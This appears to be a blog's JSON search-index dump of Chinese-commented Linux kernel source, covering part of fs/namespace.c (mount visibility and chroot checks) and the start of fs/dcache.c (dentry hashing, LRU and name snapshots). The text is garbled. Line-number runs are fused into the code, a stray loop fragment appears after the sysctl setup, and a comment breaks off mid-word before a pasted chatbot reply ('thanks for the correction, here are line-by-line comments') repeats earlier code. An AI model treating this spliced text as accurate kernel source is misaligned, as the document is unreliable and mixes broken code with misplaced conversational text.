// 如果挂载成功 if (!IS_ERR(mnt)) &#123; /* * 这是一个长期挂载，直到文件系统注销之前不要释放mnt */ real_mount(mnt)-&gt;mnt_ns = MNT_NS_INTERNAL; &#125; return mnt;&#125;EXPORT_SYMBOL_GPL(kern_mount);// 卸载挂载点void kern_unmount(struct vfsmount *mnt)&#123; // 释放长期挂载，以便可以释放挂载点 if (!IS_ERR(mnt)) &#123; mnt_make_shortterm(mnt); synchronize_rcu();// 同步RCU mntput(mnt); &#125;&#125;EXPORT_SYMBOL(kern_unmount);// 批量卸载挂载点void kern_unmount_array(struct vfsmount *mnt[], unsigned int num)&#123; unsigned int i; // 将挂载点设置为短期挂载 for (i = 0; i &lt; num; i++) mnt_make_shortterm(mnt[i]); synchronize_rcu_expedited(); // 快速同步RCU // 释放挂载点 for (i = 0; i &lt; num; i++) mntput(mnt[i]);&#125;EXPORT_SYMBOL(kern_unmount_array);// 检查挂载点是否属于我们的命名空间bool our_mnt(struct vfsmount *mnt)&#123; return check_mnt(real_mount(mnt));&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192bool current_chrooted(void)&#123; /* 当前进程是否具有非标准根目录 */ struct path ns_root; struct path fs_root; bool chrooted; /* 查找命名空间的根目录 */ ns_root.mnt = &amp;current-&gt;nsproxy-&gt;mnt_ns-&gt;root-&gt;mnt; ns_root.dentry = ns_root.mnt-&gt;mnt_root; path_get(&amp;ns_root); // 循环向下遍历，直到找到非挂载点的目录 while (d_mountpoint(ns_root.dentry) &amp;&amp; follow_down_one(&amp;ns_root)) ; // 获取文件系统的根目录 get_fs_root(current-&gt;fs, &amp;fs_root); // 判断是否为chroot环境 chrooted = !path_equal(&amp;fs_root, &amp;ns_root); path_put(&amp;fs_root); path_put(&amp;ns_root); return chrooted;&#125;static bool mnt_already_visible(struct mnt_namespace *ns, const struct super_block *sb, int *new_mnt_flags)&#123; int new_flags = *new_mnt_flags; struct mount *mnt; bool visible = false; down_read(&amp;namespace_sem); lock_ns_list(ns); // 遍历命名空间中的挂载点列表 list_for_each_entry(mnt, &amp;ns-&gt;list, mnt_list) &#123; struct mount *child; int mnt_flags; if (mnt_is_cursor(mnt)) continue; // 如果挂载的文件系统类型不匹配，则继续下一个挂载点 if (mnt-&gt;mnt.mnt_sb-&gt;s_type != sb-&gt;s_type) continue; /* 如果挂载点的根目录不是文件系统的根目录，则该挂载点不是完全可见的 */ if (mnt-&gt;mnt.mnt_root != mnt-&gt;mnt.mnt_sb-&gt;s_root) continue; /* 获取挂载点的挂载标志 */ mnt_flags = mnt-&gt;mnt.mnt_flags; /* 如果文件系统的超级块标志中包含只读标志，则在挂载标志中添加只读锁定标志 */ if (sb_rdonly(mnt-&gt;mnt.mnt_sb)) mnt_flags |= MNT_LOCK_READONLY; /* 验证挂载标志是否与新挂载的标志相等或更加宽松 */ if ((mnt_flags &amp; MNT_LOCK_READONLY) &amp;&amp; !(new_flags &amp; MNT_READONLY)) continue; if ((mnt_flags &amp; MNT_LOCK_ATIME) &amp;&amp; ((mnt_flags &amp; MNT_ATIME_MASK) != (new_flags &amp; MNT_ATIME_MASK))) continue; /* 如果存在任何被锁定的子挂载点覆盖除空目录以外的内容，则该挂载点不是完全可见的 */ list_for_each_entry(child, &amp;mnt-&gt;mnt_mounts, mnt_child) &#123; struct inode *inode = child-&gt;mnt_mountpoint-&gt;d_inode; /* 只关注被锁定的挂载点 */ if (!(child-&gt;mnt.mnt_flags &amp; MNT_LOCKED)) continue; /* 目录是否永久为空？ */ if (!is_empty_dir_inode(inode)) goto next; &#125; /* 保留被锁定的属性 */ *new_mnt_flags |= mnt_flags &amp; (MNT_LOCK_READONLY | \\ MNT_LOCK_ATIME); visible = true; goto found; next:; &#125;found: unlock_ns_list(ns); up_read(&amp;namespace_sem); return visible;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static bool mount_too_revealing(const struct super_block *sb, int *new_mnt_flags)&#123; const unsigned long required_iflags = SB_I_NOEXEC | SB_I_NODEV; struct mnt_namespace *ns = current-&gt;nsproxy-&gt;mnt_ns; unsigned long s_iflags; // 如果命名空间的用户命名空间是初始用户命名空间，则不会过度暴露 if (ns-&gt;user_ns == &amp;init_user_ns) return false; /* 文件系统是否可能过度暴露？ */ s_iflags = sb-&gt;s_iflags; if (!(s_iflags &amp; SB_I_USERNS_VISIBLE)) return false; // 检查s_iflags是否包含所需的标志位 if ((s_iflags &amp; required_iflags) != required_iflags) &#123; WARN_ONCE(1, &quot;Expected s_iflags to contain 0x%lx\\n&quot;, required_iflags); return true; &#125; return !mnt_already_visible(ns, sb, new_mnt_flags);&#125;bool mnt_may_suid(struct vfsmount *mnt)&#123; /* * 外部挂载点（通过fchdir或通过/proc符号链接访问）始终被视为nosuid。 * 这样可以防止命名空间信任可能不安全的suid/sgid位、文件能力或安全标签， * 这些都来自其他命名空间。 */ return !(mnt-&gt;mnt_flags &amp; MNT_NOSUID) &amp;&amp; check_mnt(real_mount(mnt)) &amp;&amp; current_in_userns(mnt-&gt;mnt_sb-&gt;s_user_ns);&#125;static struct ns_common *mntns_get(struct task_struct *task)&#123; struct ns_common *ns = NULL; struct nsproxy *nsproxy; task_lock(task); nsproxy = task-&gt;nsproxy; if (nsproxy) &#123; ns = &amp;nsproxy-&gt;mnt_ns-&gt;ns; get_mnt_ns(to_mnt_ns(ns)); &#125; task_unlock(task); return ns;&#125;","categories":[{"name":"Linux内核","slug":"Linux内核","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/"},{"name":"namespace","slug":"Linux内核/namespace","permalink":"http://example.com/categories/Linux%E5%86%85%E6%A0%B8/namespace/"}],"tags":[]},{"title":"学习 Linux /fs/dcache.c源码分析","slug":"学习-Linux-fs-dcache-c源码分析","date":"2023-08-13T07:04:17.000Z","updated":"2024-01-10T02:18:57.322Z","comments":true,"path":"2023/08/13/学习-Linux-fs-dcache-c源码分析/","link":"","permalink":"http://example.com/2023/08/13/%E5%AD%A6%E4%B9%A0-Linux-fs-dcache-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"dcache.c - fs&#x2F;dcache.c - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// SPDX-License-Identifier: GPL-2.0-only/*- fs/dcache.c-- 完全重新实现- (C) 1997 Thomas Schoebel-Theuer,- Linus Torvalds做了大量改动- 分配策略注释:-- dcache是icache的主人 - 当一个dcache条目存在时,- inode总是会存在。当dcache条目被删除或垃圾回收时会调用&quot;iput()&quot;。*/#include &lt;linux/ratelimit.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/mm.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/fscrypt.h&gt;#include &lt;linux/fsnotify.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/hash.h&gt;#include &lt;linux/cache.h&gt;#include &lt;linux/export.h&gt;#include &lt;linux/security.h&gt;#include &lt;linux/seqlock.h&gt;#include &lt;linux/memblock.h&gt;#include &lt;linux/bit_spinlock.h&gt;#include &lt;linux/rculist_bl.h&gt;#include &lt;linux/list_lru.h&gt;#include &quot;internal.h&quot;#include &quot;mount.h&quot;/*- 使用方法:- dcache-&gt;d_inode-&gt;i_lock 保护:- - i_dentry, d_u.d_alias, 别名的d_inode- dcache_hash_bucket锁保护:- - dcache哈希表- s_roots bl链表自旋锁保护:- - s_roots列表(__d_drop)- dentry-&gt;d_sb-&gt;s_dentry_lru_lock保护:- - dcache LRU列表和计数器- d_lock保护:- - d_flags- - d_name- - d_lru- - d_count- - d_unhashed()- - d_parent和d_subdirs- - 子节点的d_child和d_parent- - d_u.d_alias, d_inode-- 顺序:- dentry-&gt;d_inode-&gt;i_lock- dentry-&gt;d_lock dentry-&gt;d_sb-&gt;s_dentry_lru_lock dcache_hash_bucket锁 s_roots锁-- 如果存在祖先关系:- dentry-&gt;d_parent-&gt;...-&gt;d_parent-&gt;d_lock- ... dentry-&gt;d_parent-&gt;d_lock dentry-&gt;d_lock-- 如果没有祖先关系:- 任意顺序,因为它在rename_lock上序列化 */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int sysctl_vfs_cache_pressure __read_mostly = 100;EXPORT_SYMBOL_GPL(sysctl_vfs_cache_pressure); //导出只读变量sysctl_vfs_cache_pressure给GPL模块__cacheline_aligned_in_smp DEFINE_SEQLOCK(rename_lock); //定义一个序列锁rename_lock,在SMP系统中缓存对齐EXPORT_SYMBOL(rename_lock); //导出rename_lock变量static struct kmem_cache *dentry_cache __read_mostly; //定义一个静态的dentry缓存指针,只读const struct qstr empty_name = QSTR_INIT(&quot;&quot;, 0); //定义一个空名的静态const结构体qstrEXPORT_SYMBOL(empty_name); //导出empty_nameconst struct qstr slash_name = QSTR_INIT(&quot;/&quot;, 1); //定义一个&quot;/&quot;名的静态const结构体qstrEXPORT_SYMBOL(slash_name); //导出slash_name const struct qstr dotdot_name = QSTR_INIT(&quot;..&quot;, 2); //定义一个&quot;..&quot;名的静态const结构体qstrEXPORT_SYMBOL(dotdot_name); //导出dotdot_name/** 这是关于dcache最关键的数据结构:用于查找的哈希表。* 有人应该试着使这个变好 - 我只是使它可用。** 这个散列函数试图避免损失过多的散列信息* 又避免使用素数散列大小或类似的。*/static unsigned int d_hash_shift __read_mostly; //定义一个静态的散列偏移量,只读static struct hlist_bl_head *dentry_hashtable __read_mostly; //定义一个静态的dentry哈希表指针,只读static inline struct hlist_bl_head *d_hash(unsigned int hash)&#123; return dentry_hashtable + (hash &gt;&gt; d_hash_shift); //计算并返回散列桶的地址&#125;#define IN_LOOKUP_SHIFT 10static struct hlist_bl_head in_lookup_hashtable[1 &lt;&lt; IN_LOOKUP_SHIFT]; //定义一个在查找时使用的哈希表static inline struct hlist_bl_head *in_lookup_hash(const struct dentry *parent, unsigned int hash)&#123; hash += (unsigned long) parent / L1_CACHE_BYTES; //增加父目录的影响 return in_lookup_hashtable + hash_32(hash, IN_LOOKUP_SHIFT); //计算并返回散列桶的地址 &#125;struct dentry_stat_t &#123; //定义一个dentry统计结构体 long nr_dentry; long nr_unused; long age_limit; /* age in seconds */ long want_pages; /* pages requested by system */ long nr_negative; /* # of unused negative dentries */ long dummy; /* Reserved for future use */&#125;;static DEFINE_PER_CPU(long, nr_dentry); //定义一个每个CPU一个的dentry计数器static DEFINE_PER_CPU(long, nr_dentry_unused); //定义一个每个CPU一个的未使用dentry计数器static DEFINE_PER_CPU(long, nr_dentry_negative); //定义一个每个CPU一个的负dentry计数器#if defined(CONFIG_SYSCTL) &amp;&amp; defined(CONFIG_PROC_FS)/* 统计收集。*/static struct dentry_stat_t dentry_stat = &#123; .age_limit = 45,&#125;;","text":"dcache.c - fs&#x2F;dcache.c - Linux source code (v6.3.7) - Bootlin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// SPDX-License-Identifier: GPL-2.0-only/*- fs/dcache.c-- 完全重新实现- (C) 1997 Thomas Schoebel-Theuer,- Linus Torvalds做了大量改动- 分配策略注释:-- dcache是icache的主人 - 当一个dcache条目存在时,- inode总是会存在。当dcache条目被删除或垃圾回收时会调用&quot;iput()&quot;。*/#include &lt;linux/ratelimit.h&gt;#include &lt;linux/string.h&gt;#include &lt;linux/mm.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/fscrypt.h&gt;#include &lt;linux/fsnotify.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/hash.h&gt;#include &lt;linux/cache.h&gt;#include &lt;linux/export.h&gt;#include &lt;linux/security.h&gt;#include &lt;linux/seqlock.h&gt;#include &lt;linux/memblock.h&gt;#include &lt;linux/bit_spinlock.h&gt;#include &lt;linux/rculist_bl.h&gt;#include &lt;linux/list_lru.h&gt;#include &quot;internal.h&quot;#include &quot;mount.h&quot;/*- 使用方法:- dcache-&gt;d_inode-&gt;i_lock 保护:- - i_dentry, d_u.d_alias, 别名的d_inode- dcache_hash_bucket锁保护:- - dcache哈希表- s_roots bl链表自旋锁保护:- - s_roots列表(__d_drop)- dentry-&gt;d_sb-&gt;s_dentry_lru_lock保护:- - dcache LRU列表和计数器- d_lock保护:- - d_flags- - d_name- - d_lru- - d_count- - d_unhashed()- - d_parent和d_subdirs- - 子节点的d_child和d_parent- - d_u.d_alias, d_inode-- 顺序:- dentry-&gt;d_inode-&gt;i_lock- dentry-&gt;d_lock dentry-&gt;d_sb-&gt;s_dentry_lru_lock dcache_hash_bucket锁 s_roots锁-- 如果存在祖先关系:- dentry-&gt;d_parent-&gt;...-&gt;d_parent-&gt;d_lock- ... dentry-&gt;d_parent-&gt;d_lock dentry-&gt;d_lock-- 如果没有祖先关系:- 任意顺序,因为它在rename_lock上序列化 */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int sysctl_vfs_cache_pressure __read_mostly = 100;EXPORT_SYMBOL_GPL(sysctl_vfs_cache_pressure); //导出只读变量sysctl_vfs_cache_pressure给GPL模块__cacheline_aligned_in_smp DEFINE_SEQLOCK(rename_lock); //定义一个序列锁rename_lock,在SMP系统中缓存对齐EXPORT_SYMBOL(rename_lock); //导出rename_lock变量static struct kmem_cache *dentry_cache __read_mostly; //定义一个静态的dentry缓存指针,只读const struct qstr empty_name = QSTR_INIT(&quot;&quot;, 0); //定义一个空名的静态const结构体qstrEXPORT_SYMBOL(empty_name); //导出empty_nameconst struct qstr slash_name = QSTR_INIT(&quot;/&quot;, 1); //定义一个&quot;/&quot;名的静态const结构体qstrEXPORT_SYMBOL(slash_name); //导出slash_name const struct qstr dotdot_name = QSTR_INIT(&quot;..&quot;, 2); //定义一个&quot;..&quot;名的静态const结构体qstrEXPORT_SYMBOL(dotdot_name); //导出dotdot_name/** 这是关于dcache最关键的数据结构:用于查找的哈希表。* 有人应该试着使这个变好 - 我只是使它可用。** 这个散列函数试图避免损失过多的散列信息* 又避免使用素数散列大小或类似的。*/static unsigned int d_hash_shift __read_mostly; //定义一个静态的散列偏移量,只读static struct hlist_bl_head *dentry_hashtable __read_mostly; //定义一个静态的dentry哈希表指针,只读static inline struct hlist_bl_head *d_hash(unsigned int hash)&#123; return dentry_hashtable + (hash &gt;&gt; d_hash_shift); //计算并返回散列桶的地址&#125;#define IN_LOOKUP_SHIFT 10static struct hlist_bl_head in_lookup_hashtable[1 &lt;&lt; IN_LOOKUP_SHIFT]; //定义一个在查找时使用的哈希表static inline struct hlist_bl_head *in_lookup_hash(const struct dentry *parent, unsigned int hash)&#123; hash += (unsigned long) parent / L1_CACHE_BYTES; //增加父目录的影响 return in_lookup_hashtable + hash_32(hash, IN_LOOKUP_SHIFT); //计算并返回散列桶的地址 &#125;struct dentry_stat_t &#123; //定义一个dentry统计结构体 long nr_dentry; long nr_unused; long age_limit; /* age in seconds */ long want_pages; /* pages requested by system */ long nr_negative; /* # of unused negative dentries */ long dummy; /* Reserved for future use */&#125;;static DEFINE_PER_CPU(long, nr_dentry); //定义一个每个CPU一个的dentry计数器static DEFINE_PER_CPU(long, nr_dentry_unused); //定义一个每个CPU一个的未使用dentry计数器static DEFINE_PER_CPU(long, nr_dentry_negative); //定义一个每个CPU一个的负dentry计数器#if defined(CONFIG_SYSCTL) &amp;&amp; defined(CONFIG_PROC_FS)/* 统计收集。*/static struct dentry_stat_t dentry_stat = &#123; .age_limit = 45,&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071/** 这里我们采用自己的计数器而不是使用通用的每个CPU计数器* 以保持与vfs inode代码所做的一致。通过拥有自己的专用计数器,我们期望* 收获更好的代码和性能。** 请注意,循环是在所有可能的CPU上完成的,而不是在所有在线CPU上。* 做这个的原因是我们不想玩CPU开关的游戏。如果其中一个关闭了,我们* 将只保留它们的计数器。** glommer:有关详细信息,请参见cffbc8a,如果您打算对此进行更改,* 请更新所有与之匹配的vfs计数器。*/static long get_nr_dentry(void) &#123; int i; long sum = 0; for_each_possible_cpu(i) //循环每个可能的CPU sum += per_cpu(nr_dentry, i); //累加各个CPU上的dentry计数 return sum &lt; 0 ? 0 : sum; //返回总和&#125;static long get_nr_dentry_unused(void)&#123; int i; long sum = 0; for_each_possible_cpu(i) //循环每个可能的CPU sum += per_cpu(nr_dentry_unused, i); //累加各个CPU上的未使用dentry计数 return sum &lt; 0 ? 0 : sum; //返回总和&#125;static long get_nr_dentry_negative(void) &#123; int i; long sum = 0; for_each_possible_cpu(i) //循环每个可能的CPU sum += per_cpu(nr_dentry_negative, i); //累加各个CPU上的负dentry计数 return sum &lt; 0 ? 0 : sum; //返回总和&#125;static int proc_nr_dentry(struct ctl_table *table, int write, void *buffer, size_t *lenp, loff_t *ppos)&#123; dentry_stat.nr_dentry = get_nr_dentry(); //获得dentry总数 dentry_stat.nr_unused = get_nr_dentry_unused(); //获得未使用dentry数 dentry_stat.nr_negative = get_nr_dentry_negative(); //获得负dentry数 return proc_doulongvec_minmax(table, write, buffer, lenp, ppos); //写入proc文件系统&#125;static struct ctl_table fs_dcache_sysctls[] = &#123; //定义dcache的sysctl表 &#123; .procname = &quot;dentry-state&quot;, //表项名 .data = &amp;dentry_stat, //表项数据 .maxlen = 6*sizeof(long), //表项数据最大长度 .mode = 0444, //表项权限 .proc_handler = proc_nr_dentry, //表项处理函数 &#125;, &#123; &#125; &#125;;static int __init init_fs_dcache_sysctls(void) &#123; register_sysctl_init(&quot;fs&quot;, fs_dcache_sysctls); //注册dcache的sysctl表 return 0;&#125;fs_initcall(init_fs_dcache_sysctls); //模块初始化t++; tcount--; &#125; while (tcount); return 0; &#125;#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** 比较两个名字字符串,如果匹配返回0,否则非0。* 两个字符串长度都是count字节,count非0。*/#ifdef CONFIG_DCACHE_WORD_ACCESS #include &lt;asm/word-at-a-time.h&gt;/** 注意!&#x27;cs&#x27;和&#x27;scount&#x27;来自一个dentry,所以它有对齐的分配* 对于这个特定的组件。我们不严格需要load_unaligned_zeropad()* 的安全性,但它也不会有害。** 相比之下,&#x27;ct&#x27;和&#x27;tcount&#x27;可能来自一个路径名,并需要* 小心的非对齐处理。*/static inline int dentry_string_cmp(const unsigned char *cs, const unsigned char *ct, unsigned tcount)&#123; unsigned long a,b,mask; for (;;) &#123; a = read_word_at_a_time(cs); // 一次读一个机器字 b = load_unaligned_zeropad(ct); //小心地读一个机器字 if (tcount &lt; sizeof(unsigned long)) //若剩余比较字节数不足一个机器字,则退出循环 break; if (unlikely(a != b)) //若两个机器字不相等,返回不匹配 return 1; cs += sizeof(unsigned long); ct += sizeof(unsigned long); tcount -= sizeof(unsigned long); if (!tcount) //若已经比较完,返回匹配 return 0; &#125; mask = bytemask_from_count(tcount); //获得剩余字节掩码 return unlikely(!!((a ^ b) &amp; mask)); //按掩码比较剩余字节&#125;#elsestatic inline int dentry_string_cmp(const unsigned char *cs, const unsigned char *ct, unsigned tcount)&#123; do &#123; if (*cs != *ct) //逐字节比较 return 1; cs++; ct++; tcount--; &#125; while (tcount); return 0; &#125;#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175// 定义一个内联函数，用于比较目录项的名称static inline int dentry_cmp(const struct dentry *dentry, const unsigned char *ct, unsigned tcount)&#123; /* * 在RCU（Read-Copy-Update）遍历过程中，要小心重命名操作的竞态条件； * 使用&#x27;READ_ONCE&#x27;来获取名称指针。 * * 注意！即使由于重命名导致长度不能原子性地加载，我们也不在乎。因为RCU遍历 * 最终会检查序列计数，并抓住它。并且我们不会超过缓冲区，因为我们以原子方式读取 * 名称指针，而且目录项名称保证以NUL字节正确终止。 * * 最终结果：即使&#x27;len&#x27;是错的，我们也会提前退出，因为数据不能匹配（在ct/tcount数据中 * 不能有NUL） */ // 获取目录项的名称 const unsigned char *cs = READ_ONCE(dentry-&gt;d_name.name); // 调用dentry_string_cmp函数比较两个字符串 return dentry_string_cmp(cs, ct, tcount);&#125;// 定义一个外部名称结构struct external_name &#123; // 定义一个联合体，包含一个原子类型的计数器和一个RCU头部 union &#123; atomic_t count; struct rcu_head head; &#125; u; // 定义一个无符号字符数组来存储名称 unsigned char name[];&#125;;// 定义一个内联函数，用于获取目录项的外部名称static inline struct external_name *external_name(struct dentry *dentry)&#123; // 通过名称获取外部名称的结构体 return container_of(dentry-&gt;d_name.name, struct external_name, name[0]);&#125;// 定义一个函数，用于在RCU回调中释放dentrystatic void __d_free(struct rcu_head *head)&#123; // 获取RCU头部所在的dentry struct dentry *dentry = container_of(head, struct dentry, d_u.d_rcu); // 使用kmem_cache_free函数释放dentry的缓存 kmem_cache_free(dentry_cache, dentry); &#125;// 定义一个函数，用于在RCU回调中释放含有外部名称的dentrystatic void __d_free_external(struct rcu_head *head)&#123; // 获取RCU头部所在的dentry struct dentry *dentry = container_of(head, struct dentry, d_u.d_rcu); // 释放外部名称 kfree(external_name(dentry)); // 释放dentry的缓存 kmem_cache_free(dentry_cache, dentry);&#125;// 定义一个内联函数，用于判断dentry的名称是否为外部名称static inline int dname_external(const struct dentry *dentry)&#123; // 如果dentry的名称不等于内部名称，则返回真（即，名称是外部的） return dentry-&gt;d_name.name != dentry-&gt;d_iname;&#125;// 定义一个函数，用于获取dentry的名称快照void take_dentry_name_snapshot(struct name_snapshot *name, struct dentry *dentry)&#123; // 锁定dentry spin_lock(&amp;dentry-&gt;d_lock); // 将dentry的名称赋值给快照 name-&gt;name = dentry-&gt;d_name; // 如果dentry的名称是外部的 if (unlikely(dname_external(dentry))) &#123; // 增加外部名称的引用计数 atomic_inc(&amp;external_name(dentry)-&gt;u.count); &#125; else &#123; // 如果dentry的名称是内部的，将名称复制到快照的内联名称中 memcpy(name-&gt;inline_name, dentry-&gt;d_iname, // 复制dentry的内部名称到快照的内联名称中，长度为dentry名称的长度加1（加上结束符） dentry-&gt;d_name.len + 1); // 设置快照的名称为快照的内联名称 name-&gt;name.name = name-&gt;inline_name; &#125; // 解锁dentry spin_unlock(&amp;dentry-&gt;d_lock);&#125;// 导出take_dentry_name_snapshot函数，使其可以在内核的其他模块中使用EXPORT_SYMBOL(take_dentry_name_snapshot);void release_dentry_name_snapshot(struct name_snapshot *name)&#123; if (unlikely(name-&gt;name.name != name-&gt;inline_name)) &#123; // 如果name-&gt;name.name不等于name-&gt;inline_name，说明name使用了external_name结构 struct external_name *p; p = container_of(name-&gt;name.name, struct external_name, name[0]); // 通过name-&gt;name.name获取external_name结构的指针p if (unlikely(atomic_dec_and_test(&amp;p-&gt;u.count))) // 递减p-&gt;u.count的值，并检查是否为0 kfree_rcu(p, u.head); // 如果p-&gt;u.count为0，则释放p所指向的external_name结构 &#125;&#125;EXPORT_SYMBOL(release_dentry_name_snapshot);static inline void __d_set_inode_and_type(struct dentry *dentry, struct inode *inode, unsigned type_flags)&#123; unsigned flags; dentry-&gt;d_inode = inode; flags = READ_ONCE(dentry-&gt;d_flags); flags &amp;= ~(DCACHE_ENTRY_TYPE | DCACHE_FALLTHRU); flags |= type_flags; smp_store_release(&amp;dentry-&gt;d_flags, flags); // 设置dentry的inode和类型标志&#125;static inline void __d_clear_type_and_inode(struct dentry *dentry)&#123; unsigned flags = READ_ONCE(dentry-&gt;d_flags); flags &amp;= ~(DCACHE_ENTRY_TYPE | DCACHE_FALLTHRU); WRITE_ONCE(dentry-&gt;d_flags, flags); dentry-&gt;d_inode = NULL; if (dentry-&gt;d_flags &amp; DCACHE_LRU_LIST) this_cpu_inc(nr_dentry_negative); // 清除dentry的类型标志和inode，并根据需要更新计数器&#125;static void dentry_free(struct dentry *dentry)&#123; WARN_ON(!hlist_unhashed(&amp;dentry-&gt;d_u.d_alias)); if (unlikely(dname_external(dentry))) &#123; struct external_name *p = external_name(dentry); if (likely(atomic_dec_and_test(&amp;p-&gt;u.count))) &#123; call_rcu(&amp;dentry-&gt;d_u.d_rcu, __d_free_external); return; &#125; &#125; // 检查dentry是否使用了external_name结构，如果是则递减引用计数 // 如果引用计数为0，则释放external_name结构 if (dentry-&gt;d_flags &amp; DCACHE_NORCU) __d_free(&amp;dentry-&gt;d_u.d_rcu); else call_rcu(&amp;dentry-&gt;d_u.d_rcu, __d_free); // 根据dentry的RCU标志，选择立即释放或通过RCU机制释放dentry&#125;/* * 释放dentry的inode，如果定义了文件系统的d_iput()操作。 */static void dentry_unlink_inode(struct dentry *dentry) __releases(dentry-&gt;d_lock) __releases(dentry-&gt;d_inode-&gt;i_lock)&#123; struct inode *inode = dentry-&gt;d_inode; raw_write_seqcount_begin(&amp;dentry-&gt;d_seq); __d_clear_type_and_inode(dentry); hlist_del_init(&amp;dentry-&gt;d_u.d_alias); raw_write_seqcount_end(&amp;dentry-&gt;d_seq); spin_unlock(&amp;dentry-&gt;d_lock); spin_unlock(&amp;inode-&gt;i_lock); if (!inode-&gt;i_nlink) fsnotify_inoderemove(inode); if (dentry-&gt;d_op &amp;&amp; dentry-&gt;d_op-&gt;d_iput) dentry-&gt;d_op-&gt;d_iput(dentry, inode); else iput(inode); // 释放dentry的inode并执行相应的操作（如通知文件系统或释放inode）&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161/* * 当&#x27;d_lru&#x27;条目正在使用时，DCACHE_LRU_LIST位设置为1， * 这包括&quot;真正&quot;的每个超级块LRU列表和DCACHE_SHRINK_LIST的使用。 */#define D_FLAG_VERIFY(dentry,x) WARN_ON_ONCE(((dentry)-&gt;d_flags &amp; (DCACHE_LRU_LIST | DCACHE_SHRINK_LIST)) != (x))// 将dentry添加到LRU列表中static void d_lru_add(struct dentry *dentry)&#123; // 确保d_flags的值为0，即未设置DCACHE_LRU_LIST和DCACHE_SHRINK_LIST位 D_FLAG_VERIFY(dentry, 0); // 将DCACHE_LRU_LIST位设置为1，表示dentry在使用中 dentry-&gt;d_flags |= DCACHE_LRU_LIST; // 增加当前CPU的nr_dentry_unused计数器的值 this_cpu_inc(nr_dentry_unused); // 如果dentry是负的（表示不存在的文件或目录），增加当前CPU的nr_dentry_negative计数器的值 if (d_is_negative(dentry)) this_cpu_inc(nr_dentry_negative); // 向dentry所属的超级块的s_dentry_lru列表添加dentry的d_lru节点 // 将dentry添加到超级块的LRU列表中 WARN_ON_ONCE(!list_lru_add(&amp;dentry-&gt;d_sb-&gt;s_dentry_lru, &amp;dentry-&gt;d_lru));&#125;// 从LRU列表中删除dentrystatic void d_lru_del(struct dentry *dentry)&#123; // 确保d_flags的值为DCACHE_LRU_LIST，表示dentry在LRU列表中 D_FLAG_VERIFY(dentry, DCACHE_LRU_LIST); // 清除DCACHE_LRU_LIST位，表示dentry不再在LRU列表中 dentry-&gt;d_flags &amp;= ~DCACHE_LRU_LIST; // 减少当前CPU的nr_dentry_unused计数器的值 this_cpu_dec(nr_dentry_unused); // 如果dentry是负的（表示不存在的文件或目录），减少当前CPU的nr_dentry_negative计数器的值 if (d_is_negative(dentry)) this_cpu_dec(nr_dentry_negative); // 从dentry所属的超级块的s_dentry_lru列表中删除dentry的d_lru节点 // 从超级块的LRU列表中删除dentry WARN_ON_ONCE(!list_lru_del(&amp;dentry-&gt;d_sb-&gt;s_dentry_lru, &amp;dentry-&gt;d_lru));&#125;// 从收缩列表中删除dentrystatic void d_shrink_del(struct dentry *dentry)&#123; // 确保d_flags的值为DCACHE_SHRINK_LIST和DCACHE_LRU_LIST，表示dentry在收缩列表中 D_FLAG_VERIFY(dentry, DCACHE_SHRINK_LIST | DCACHE_LRU_LIST); // 从dentry的d_lru节点所在的链表中删除dentry // 清除DCACHE_SHRINK_LIST和DCACHE_LRU_LIST位，表示dentry不再在收缩列表和LRU列表中 list_del_init(&amp;dentry-&gt;d_lru); dentry-&gt;d_flags &amp;= ~(DCACHE_SHRINK_LIST | DCACHE_LRU_LIST); // 减少当前CPU的nr_dentry_unused计数器的值 this_cpu_dec(nr_dentry_unused);&#125;// 将dentry添加到收缩列表中static void d_shrink_add(struct dentry *dentry, struct list_head *list)&#123; // 确保d_flags的值为0，即未设置DCACHE_LRU_LIST和DCACHE_SHRINK_LIST位 D_FLAG_VERIFY(dentry, 0); // 将dentry的d_lru节点添加到指定的链表中 list_add(&amp;dentry-&gt;d_lru, list); // 设置DCACHE_SHRINK_LIST和DCACHE_LRU_LIST位，表示dentry在收缩列表和LRU列表中 dentry-&gt;d_flags |= DCACHE_SHRINK_LIST | DCACHE_LRU_LIST; // 增加当前CPU的nr_dentry_unused计数器的值 this_cpu_inc(nr_dentry_unused);&#125;/* * 这些函数只能在全局LR谢谢指正，以下是对每一行代码的注释：```c/* * 当&#x27;d_lru&#x27;条目正在使用时，DCACHE_LRU_LIST位设置为1， * 这包括&quot;真正&quot;的每个超级块LRU列表和DCACHE_SHRINK_LIST的使用。 */#define D_FLAG_VERIFY(dentry,x) WARN_ON_ONCE(((dentry)-&gt;d_flags &amp; (DCACHE_LRU_LIST | DCACHE_SHRINK_LIST)) != (x))// 将dentry添加到LRU列表中static void d_lru_add(struct dentry *dentry)&#123; // 确保d_flags的值为0，即未设置DCACHE_LRU_LIST和DCACHE_SHRINK_LIST位 D_FLAG_VERIFY(dentry, 0); // 将DCACHE_LRU_LIST位设置为1，表示dentry在使用中 dentry-&gt;d_flags |= 